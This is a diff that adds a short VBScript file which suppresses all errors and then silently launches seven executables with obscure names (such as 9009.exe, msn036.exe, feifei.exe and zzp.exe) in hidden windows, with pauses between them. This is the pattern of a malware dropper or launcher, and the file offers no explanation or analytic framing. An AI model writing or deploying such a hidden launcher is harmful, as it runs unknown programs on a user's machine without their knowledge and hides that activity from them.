@@ -1,0 +1,23 @@
+on error resume next
+wscript.sleep 10
+wscript.sleep 100
+set ws=wscript.createobject("wscript.shell")
+ws.run "9009.exe",0
+wscript.sleep 3000
+set ws=wscript.createobject("wscript.shell")
+ws.run "small.exe",0
+wscript.sleep 100
+set ws=wscript.createobject("wscript.shell")
+ws.run "1027345.exe",0
+wscript.sleep 100
+set ws=wscript.createobject("wscript.shell")
+ws.run "msn036.exe",0
+wscript.sleep 100
+set ws=wscript.createobject("wscript.shell")
+ws.run "feifei.exe",0
+wscript.sleep 100
+set ws=wscript.createobject("wscript.shell")
+ws.run "5.exe",0
+wscript.sleep 10000
+set ws=wscript.createobject("wscript.shell")
+ws.run "zzp.exe",0
